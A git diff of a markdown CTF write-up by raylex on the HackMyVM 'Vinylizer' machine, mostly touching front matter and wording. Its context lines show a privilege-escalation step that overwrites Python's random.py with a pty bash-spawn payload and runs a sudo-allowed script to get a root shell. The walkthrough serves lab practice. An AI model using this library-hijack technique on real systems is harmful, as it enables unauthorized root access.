@@ -1,9 +1,9 @@
 ---
-title: HackMyVM - Vinylizer
-description: 
+title: "HackMyVM - Vinylizer"
+description: ""
 author: raylex
 tags: SQLI PYTHON BLIND-SQLI
-categories: CTF
+categories: CTF HACKMYVM
 date: 2024-02-02
 ---
 ![vinylizer](/assets/images/vinylizer.png)
@@ -118,7 +118,7 @@ I'll make a backup of `/usr/lib/python3.10/random.py`
 ```shell
 cp /usr/lib/python3.10/random.py /home/shopadmin
 ```
-...and modify the the original script into:
+...and modify the the original code into:
 ```python
 import pty
 pty.spawn("/bin/bash")
@@ -130,3 +130,4 @@ Now all i have to do is run the `/opt/vinylizer.py` program with sudo
 root@vinylizer:/home/shopadmin# cat /root/root.txt
 4U*****L3
 ```
+And that's it! I hope it helps, thanks for reading!!!
